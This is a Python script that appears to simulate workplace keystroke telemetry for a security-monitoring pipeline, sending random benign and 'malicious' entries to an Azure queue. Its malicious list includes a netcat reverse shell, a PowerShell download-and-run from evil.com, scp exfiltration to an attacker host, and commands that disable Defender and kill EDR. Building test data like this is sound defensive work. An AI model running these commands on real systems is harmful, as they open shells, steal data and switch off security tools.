import json
import random
import time
from azure.storage.queue import QueueClient, TextBase64EncodePolicy

conn_str = "<YOUR_AZURE_CONNECTION_STRING_HERE>"
queue_client = QueueClient.from_connection_string(
    conn_str, 
    "uam-telemetry-queue",
    message_encode_policy=TextBase64EncodePolicy()
)

# ENTERPRISE SIMULATION DATA ---

USERS = [
    "dev.smith", "finance.jones", "hr.davis", "admin.root", "mktg.taylor",
    "dev.jones", "hr.alex"
]

APPS = [
    "chrome.exe", "code.exe", "outlook.exe", "excel.exe", 
    "powershell.exe", "cmd.exe", "slack.exe", "notepad.exe",
    "discord.exe", "zoom.exe", "intellij.exe"
]

BENIGN_KEYSTROKES = [
    "npm install express --save",
    "git commit -m 'fixed login bug'",
    "Dear team, please find the Q3 report attached.",
    "www.google.com/search?q=how+to+center+a+div",
    "Meeting at 3 PM tomorrow, does that work?",
    "=SUM(B2:B15)",
    "Can someone review my pull request?",
    "cd /var/www/html && ls -la",
    "Project kickoff notes: 1. Budget 2. Timeline 3. Scope",
    "docker-compose up -d"
]

MALICIOUS_KEYSTROKES = [
    #  Credential & Key Leakage
    "export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE",
    "Here is the master password: P@ssw0rd123!",
    "4111 2222 3333 4444 12/26 123", 
    
    #  Reverse Shells & Hacking Tools
    "nc -e /bin/sh 10.0.0.50 4444",
    "powershell -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')\"",
    "nmap -sV -p- 192.168.1.0/24",
    
    #  Data Exfiltration (Insider Threat)
    "tar -czvf customer_database_dump.tar.gz /var/lib/mysql/",
    "scp /users/finance/payroll_2024.xlsx attacker@10.0.0.5:/tmp/",
    "SELECT * FROM users WHERE credit_card IS NOT NULL;",
    
    #  EDR / Antivirus Evasion
    "Set-MpPreference -DisableRealtimeMonitoring $true",
    "taskkill /F /IM sentinelone.exe"
]

print("TELEMETRY SIMULATOR STARTED")
print("Generating enterprise traffic. (Press Ctrl+C to stop)")
print("-" * 60)

while True:
    # 85% chance of normal activity, 15% chance of a security incident
    is_malicious = random.random() < 0.3
    
    user = random.choice(USERS)
    app = random.choice(APPS)
    
    if is_malicious:
        if random.random() < 0.6:
            app = random.choice(["powershell.exe", "cmd.exe", "notepad.exe", "slack.exe"])
        keys = random.choice(MALICIOUS_KEYSTROKES)
    else:
        keys = random.choice(BENIGN_KEYSTROKES)
        
    data = {
        "user": user,
        "application": app,
        "keystroke_buffer": keys
    }
    
    try:
        message = json.dumps(data)
        queue_client.send_message(message)
        
        if is_malicious:
            print(f" THREAT INJECTED: [{user}] in [{app}]")
        else:
            print(f" Normal Traffic Sent: [{user}]")
            
    except Exception as e:
        print(f" Failed to send: {e}")
        
    time.sleep(random.uniform(5.0, 10.0))